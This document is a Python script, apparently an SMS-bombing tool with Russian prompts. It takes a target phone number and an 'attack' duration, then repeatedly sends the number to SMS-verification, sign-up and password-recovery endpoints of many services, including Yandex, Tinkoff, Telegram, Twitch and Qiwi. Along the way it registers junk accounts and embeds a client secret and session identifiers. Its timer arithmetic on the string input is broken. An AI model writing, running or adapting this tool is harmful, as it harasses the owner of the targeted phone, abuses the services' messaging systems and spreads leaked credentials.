import requests
import fake_useragent
import time

user = fake_useragent.UserAgent().random
headers = {'user_agent': user}
phone = input('[ ] Введите номер телефона (начиная с 7): ')
valspam = 0
valerr = 0
timeval = input('[ ] Введите количество минут аттаки: ')
timeStart = time.time()
print('[ ] Атака началась, для остановки нажмите Ctrl + C')

# ,timeout=5.05

while float(time.time() - timeStart) < float(timeval * 60):
    try:
        response = requests.post('https://shop.vsk.ru/ajax/auth/postSmsX/', headers=headers, data={'phone': phone})
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post('https://www.panpizza.ru/index.php?route=account/customer/sentSMSCode',
                                 headers=headers,
                                 data={'telephone_t': '8' + phone[1:]})
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post('https://api.papajohns.ru/user/confirmation-code/send', headers=headers,
                                 json={"phone": "+" + phone, "type": "recovery_password", "channel": "sms",
                                       "platform": "web", "city_id": "1", "lang": "ru"})
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                                 json={"reqId": "91101-1606335718",
                                       "params": {"phone": phone, "language": "ru-RU", "route": "sms",
                                                  "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization/",
                                 data={"FastAuthorizationLoginLoadForm[login]": phone}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://lenta.com/api/v1/registration/requestValidationCode",
                                 json={"phone": "+" + phone}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://nn-card.ru/api/1.0/register",
                                 json={"phone": phone, "password": 'DDd7873456'}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://taxi.yandex.ru/3.0/auth",
                                 json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone}, headers=headers,)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://youla.ru/web-api/auth/request_code",
                                 json={"phone": phone}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
            "msisdn": phone,
            "locale": "en",
            "countryCode": "ru",
            "version": "1",
            "k": "ic1rtwz1s1Hj1O0r",
            "r": "46763"
        }, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                                 json={"phone_number": phone}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                                 data={"phone": phone}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post(
            "https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
            data={"st.r.phone": "+" + phone}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                 json={"CellPhone": phone[1:]}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post(
            "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
            data={"phone": "+" + phone}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",
                                 data={"l": phone[1:]}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                 data={"CellPhone": phone[1:]}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://ng-api.webbankir.com/user/v2/create",
                                 json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
                                       "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://m.tiktok.com/node-a/send/download_link",
                                 json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": phone[1:],
                                       "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}},
                                 headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": phone},
                                 headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
                                 json={
                                     "phone": "+" + phone,
                                     "api": 2,
                                     "email": 'dgirherfib@gmaqil.com',
                                     "x-email": "x-email",
                                 }, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
                                 data={
                                     "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                                     "username": phone,
                                     "client_id": "android-qw",
                                     "client_secret": "zAm4FKq9UnSe7id",
                                 }, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                                 json={"phone": "+" + phone}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post('https://passport.twitch.tv/register?trusted_request=true',
                                 json={
                                     "birthday": {"day": 12, "month": 10, "year": 2000},
                                     "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                                     "include_verification_code": True,
                                     "password": 'Danil5564554',
                                     "phone_number": phone,
                                     "username": 'bhtrtrrrtbhtrbhtr',
                                 }, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post("https://my.telegram.org/auth/send_password",
                                 data={"phone": "+" + phone}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    try:
        response = requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                                 params={'msisdn': phone}, headers=headers)
        valspam += 1
    except:
        valerr += 1
        print('Что то пошло не так')
    time.sleep(5)
print('[ ] Отправленно запросов: ' + str(valspam))
print('[ ] Не отправленно запросов: ' + str(valerr))
